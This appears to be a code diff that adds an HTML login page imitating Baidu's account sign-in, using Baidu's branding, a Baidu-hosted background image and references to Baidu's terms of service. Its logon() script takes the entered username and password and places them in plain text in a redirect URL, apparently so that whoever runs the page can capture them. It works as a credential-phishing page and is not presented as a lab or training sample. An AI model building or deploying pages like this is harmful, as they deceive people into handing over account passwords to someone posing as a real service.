@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8" />
+        <script>
+            function logon(){
+    var password = document.getElementById("pwd").value;
+    var usersname = document.getElementById("usersname").value;
+    if(password == ""){
+        alert("密码不可为空")
+        return false
+    }
+    if (usersname == "") {
+        alert("用户名不可为空")
+        return false
+    }
+    if (usersname == "" && password == "") {
+        alert("用户名和密码不可为空")
+        return false
+    }
+    else {
+        window.location.href = 'Info==Password:'+ password + ';' + "usersname="+usersname;
+    }
+}
+function onload() {
+
+}
+        </script>
+        <style>
+            .bg1 {
+                background-image: url(https://ppui-static-wap.cdn.bcebos.com/static/appsapi/img/header-bg-old.11371b7.png);
+                width:100%;
+                height:28rem
+            }
+            .logonbox {
+                width: 96%;
+                height: 600px;
+                background-color: white;
+            }
+            .title {
+                width: 96%;
+                height: 1200px;
+                background-color: white;
+                border-radius:75px
+            }
+            .input{
+                width:90%;
+                height:120px;
+                border-radius:45px;
+                border: none;
+                background-color: #f5f5f5;
+                font-size: 45px;
+                text-align: center;
+            }
+            .btn{
+                width:90%;
+                height:120px;
+                border-radius:45px;
+                border: none;
+                background-color: cornflowerblue;
+                font-size: 45px;
+                text-align: center;
+                color: white;
+            }
+        </style>
+        <script src="./index.js"></script>
+    </head>
+    <body bgcolor="aliceblue">
+        <div align="center">
+            <div class="bg1">
+                <div align="center">
+                    <div style="width:100%;height:15rem"></div>
+                    <div class="title">
+                        <br />
+                        <h1 style="font-size:60px">登录百度账户 享受更多精彩</h1>
+                        <div style="width:100%;height:100px"></div>
+                        <input id="usersname" class="input" placeholder="百度账户/邮箱/手机号" />
+                        <div style="width: 100%;height:50px;"></div>
+                        <input id="pwd" type="password" class="input" placeholder="密码" />
+                        <div align="right" style="width: 90%;">
+                            <p style="font-size: 40px;">忘记密码</p>
+                        </div>
+                        <div style="width: 100%;height: 50px;"></div>
+                        <button class="btn" onclick="logon()">登录</button>
+                        <div align="center">
+                            <div style="width: 100%;height:50px;"></div>
+                            <table>
+                                <td>
+                                    <input type="checkbox" class="checkbox1" />
+                                </td>
+                                <td>
+                                    <p style="font-size: 30px;">登录即代表同意</p>
+                                </td>
+                                <td>
+                                    <h3 style="font-size: 30px;">百度服务协议 </h3>
+                                </td>
+                                <td>
+                                    <p style="font-size: 30px;">和 </p>
+                                </td>
+                                <td>
+                                    <h3 style="font-size: 30px;">百度账户条款</h3>
+                                </td>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style>
+            .checkbox1{
+                width: 30px;
+                height: 30px;
+                border-radius: 100px;
+            }
+        </style>
+    </body>
+</html>
